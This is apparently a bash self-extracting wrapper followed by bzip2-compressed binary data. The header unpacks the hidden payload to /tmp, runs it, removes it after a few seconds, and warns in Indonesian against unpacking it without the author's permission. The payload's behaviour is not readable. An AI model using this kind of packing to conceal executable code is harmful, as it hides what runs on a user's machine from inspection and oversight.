#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYY=  �� 0 }���?�߮����P�    ��`�CM22a �@Md��4���dd���0�4ɀi�4�ɄM a4i� 4�2i��� �h�& 4H@� A�bM=L��Ѥ1�z�d�S6��=�������W��,ٱr�����zEϱ���b���<ֶ0�9����b�r��x�=�����ɩ�|H����th���{��Sl��ﻏ��R����s�Y��:3:�y�gdD�H�����!Zd����n'FYI���l?k�؝�v�s�����a���`iu�PO//.J�>6 ��kg�)��zR_�}(=����s����pp����� �6tR��3��6�q=�8��:@�j�V=�u�ё]HM�3{y���Hz"���nq2a���2^��c�������k	7�#k�w50�kl~c�����k�X۹]c��צv�a��C�2
�r��0vj�c���pٌ�氛���1�?������cՖ������������5�h�A��d50R|��mΆ�U1Q�p��fԮܠ���8��f�L:��%�˧E}�3��#>����ى�P��ݳ &��8�_���_ٹ�X9�@�y_�����Sv�̵�@v]sF�V��3d����MNyԇ�.������"�&Ѻ���dX��S�͊0��h�Z[�cr�D+\�MH��3���]!���+�!�.y�ͮvbV�>M�����u�l|L��|��t��7I
����þ'y�����xއ#1��^����(T�ݘT�#c��L5:�u;\K�+y̚����V��e�[}k{����;�~���$�����w;�ٽ�n�c���I��V��5)'���T9�PZ;��`�Va��ʿ���҇&8`cC��eCSt��|Kn"z_>������`��	���L���v������������!�/ �<P��yZt6V��������cPZ�w(�a���js���y�8:�v��u�ǅ��3p���ٲ�AS�mv�@ʄ=L4ka�>VF�XumC+���57� ɴoi���ߤo|�_�73���253jr�^\��֍Kཆo[��	�p���H�
!㧠